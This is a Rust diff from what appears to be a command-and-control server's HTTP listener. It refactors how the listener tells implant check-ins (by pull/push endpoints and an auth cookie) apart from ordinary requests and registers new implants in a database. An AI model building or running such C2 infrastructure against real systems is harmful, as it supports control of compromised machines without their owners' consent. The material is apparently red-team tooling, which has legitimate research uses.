@@ -32,19 +32,9 @@ fn handle_connection(mut stream: TcpStream, listener_id: u16)
     let mut buffer: [u8; 1024] = [0; 1024];
     stream.read(&mut buffer).unwrap();
 
-    let get: &[u8; 6] = b"GET / ";
-    let http_cookie = &CONFIG.listener.http.cookie_name;
-    
-    // Respond with greetings or a 404,
-    // depending on the data in the request
-    let (http_response_headers, response_body_page_path) = if buffer.starts_with(get)
-    {
-        ("HTTP/1.1 200 OK\r\n\r\n", &CONFIG.listener.http.default_page_path)
-    } else {
-        ("HTTP/1.1 404 Not Found\r\n\r\n", &CONFIG.listener.http.default_error_page_path)
-    };
+    let (http_response_headers, response_body_page_path) = prepare_http_response(buffer);
 
-    let http_response_body = if Path::new(response_body_page_path).exists()
+    let http_response_body = if Path::new(&response_body_page_path).exists()
     {
         match fs::read(response_body_page_path)
         {
@@ -56,36 +46,22 @@ fn handle_connection(mut stream: TcpStream, listener_id: u16)
         vec![]
     };
 
-    let regex_string = format!("Cookie: {}=([a-f0-9A-F]*)", http_cookie);
-    let re = Regex::new(regex_string.as_str()).unwrap();
-    let caps: Option<Captures> = re.captures(&buffer);
 
-    if caps.is_some()
+    let (is_implant, implant_auth_cookie) = check_if_implant(buffer);
+
+    if is_implant
     {
-        let capture_match: Option<Match> = caps.unwrap().get(1);
-        if capture_match.is_some()
+        if ! database::check_if_implant_in_db(&implant_auth_cookie)
         {
-            let cookie_indexes: Match = capture_match.unwrap();
-            let cookie: Vec<u8> = buffer[cookie_indexes.start()..cookie_indexes.end()].to_vec();
-            let cookie_str: Result<String, FromUtf8Error> = String::from_utf8(cookie);
+            println!("\n[+] Adding to database implant with hash: {}", &implant_auth_cookie);
 
-            if cookie_str.is_ok()
+            if database::add_implant(listener_id, &implant_auth_cookie)
             {
-                let implant_cookie_hash: String = cookie_str.unwrap();
-
-                if ! database::check_if_implant_in_db(&implant_cookie_hash)
-                {
-                    println!("[+] Adding to database implant with hash: {}\n", implant_cookie_hash);
-
-                    if database::add_implant(listener_id, &implant_cookie_hash)
-                    {
-                        println!("[+] Implant successfully added to the database");
-                    }
-                    else
-                    {
-                        println!("[!] Failed to add the implant to the database");
-                    }
-                }
+                println!("[+] Implant successfully added to the database");
+            }
+            else
+            {
+                println!("[!] Failed to add the implant to the database");
             }
         }
     }
@@ -161,4 +137,68 @@ pub fn start_listener(listener_id: u16, rx: Receiver<ListenerSignal>)
             }
         }
     }
+}
+
+fn prepare_http_response(buffer: [u8; 1024]) -> (String, String)
+{
+    let get: &[u8; 6] = b"GET / ";
+
+    let page_path: String = (&CONFIG.listener.http.default_page_path).to_string();
+    let error_page_path: String = (&CONFIG.listener.http.default_error_page_path).to_string();
+    let ok_response_code: String = "HTTP/1.1 200 OK\r\n\r\n".to_string();
+    let not_found_response_code: String = "HTTP/1.1 404 Not Found\r\n\r\n".to_string();
+
+    if buffer.starts_with(get)
+    {
+        return (ok_response_code, page_path);
+    }
+    else {
+        return (not_found_response_code, error_page_path);
+    };
+}
+
+fn check_if_implant(buffer: [u8; 1024]) -> (bool, String)
+{
+    let implant_pull_request = format!(
+        "{} /{} HTTP/",
+        &CONFIG.listener.http.pull_method,
+        &CONFIG.listener.http.pull_endpoint,
+    );
+
+    let implant_push_request = format!(
+        "{} /{} HTTP/",
+        &CONFIG.listener.http.push_method,
+        &CONFIG.listener.http.push_endpoint,
+    );
+
+    let mut implant_auth_cookie: String = String::new();
+
+    let is_implant: bool = buffer.starts_with(implant_push_request.as_bytes()) || buffer.starts_with(implant_pull_request.as_bytes());
+
+    if is_implant
+    {
+        let http_cookie = &CONFIG.listener.http.cookie_name;
+        let regex_string = format!("Cookie: {}=([a-f0-9A-F]*)", http_cookie);
+    
+        let re = Regex::new(regex_string.as_str()).unwrap();
+        let caps: Option<Captures> = re.captures(&buffer);
+
+        if caps.is_some()
+        {
+            let capture_match: Option<Match> = caps.unwrap().get(1);
+            if capture_match.is_some()
+            {
+                let cookie_indexes: Match = capture_match.unwrap();
+                let cookie: Vec<u8> = buffer[cookie_indexes.start()..cookie_indexes.end()].to_vec();
+                let cookie_str: Result<String, FromUtf8Error> = String::from_utf8(cookie);
+
+                if cookie_str.is_ok()
+                {
+                    implant_auth_cookie = cookie_str.unwrap();
+                }
+            }
+        }
+    }
+
+    return (is_implant, implant_auth_cookie);
 }
